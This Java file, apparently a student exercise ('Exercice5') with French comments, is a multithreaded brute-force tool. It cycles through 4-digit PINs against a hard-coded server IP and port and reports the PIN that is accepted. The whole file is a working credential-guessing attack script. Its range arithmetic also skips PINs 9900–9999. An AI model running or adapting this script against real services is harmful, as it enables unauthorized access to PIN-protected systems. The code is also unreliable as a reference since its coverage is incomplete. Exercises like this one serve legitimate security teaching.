package org.example;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Exercice5 {

    private static final String SERVER_ADDRESS = "51.195.253.124";
    private static final int SERVER_PORT = 12345;
    private static final int THREAD_COUNT = 150; // Nombre de threads à utiliser
    // J'ai un serveur qui fait 300 requêtes par seconde a baisser pour faire marcher sur un pc
    //fait un timer
    static long startTime = System.currentTimeMillis();
    public static void main(String[] args) {
        ExecutorService executorService = Executors.newFixedThreadPool(THREAD_COUNT);
        int range = 10000 / THREAD_COUNT; // Nombre de code PIN à tester par thread
        for (int i = 0; i < THREAD_COUNT; i++) {
            int finalI = i;
            executorService.submit(() -> { // Créer un nouveau thread
                try {
                    bruteforce(finalI * range, (finalI + 1) * range); // Lancer la recherche de code PIN
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });
        }
        executorService.shutdown();
    }

    // Méthode de recherche de code PIN
    private static void bruteforce(int start, int end) throws IOException {
        //Pour chaque code PIN
        for (int i = start; i < end; i++) {
            try (Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT); // Connexion au serveur
                 PrintWriter out = new PrintWriter(socket.getOutputStream(), true); // Création des flux d'entrée et de sortie
                 BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) { // Création des flux d'entrée et de sortie
                // Lire la demande de PIN du serveur
                in.readLine();
                // Envoyer le code PIN au serveur
                String pin = String.format("%04d", i);
                out.println(pin);
                // Lire la réponse du serveur
                String response = in.readLine();
                //System.out.println("PIN : " + pin + " - " + response);
                if (!response.contains("Incorrect PIN")) {
                    System.out.println("Code PIN trouvé : " + pin);
                    System.out.println("PIN : " + pin + " - " + response);
                    System.out.println("Temps d'exécution : " + (System.currentTimeMillis() - startTime ) + "ms");
                    return;
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}